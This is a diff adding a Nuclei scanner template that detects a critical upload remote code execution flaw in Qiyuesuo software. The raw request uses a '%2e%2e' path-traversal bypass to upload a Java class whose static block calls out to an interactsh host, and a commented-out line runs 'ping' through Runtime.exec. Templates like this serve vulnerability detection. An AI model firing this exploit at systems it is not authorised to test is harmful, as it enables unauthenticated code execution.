@@ -1,0 +1,43 @@
+id: qiyuesuo-upload-rce
+
+info:
+  name: qiyuesuo-upload-rce
+  severity: critical
+  author: qiyuesuo-upload-rce
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /login/%2e%2e/utask/upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/531.2 (KHTML, like Gecko) Chrome/49.0.818.0 Safari/531.2
+        Content-Type: multipart/form-data; boundary=--------------------------{{boundary}}
+        
+        ----------------------------{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
+        Content-Type: text/plain
+        
+        package com;        
+        import com.qiyuesuo.utask.java.BaseTimerTask;        
+        import java.lang.reflect.Method;        
+        public class sleepPayload extends BaseTimerTask {        
+            static {        
+                try {        
+                    //Runtime.getRuntime().exec(new String[]{"ping","{{interactsh-url}}"});
+                    java.net.InetAddress.getByName("{{interactsh-url}}");
+                }catch (Exception e){}        
+            }        
+        }
+        
+        ----------------------------{{boundary}}--
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
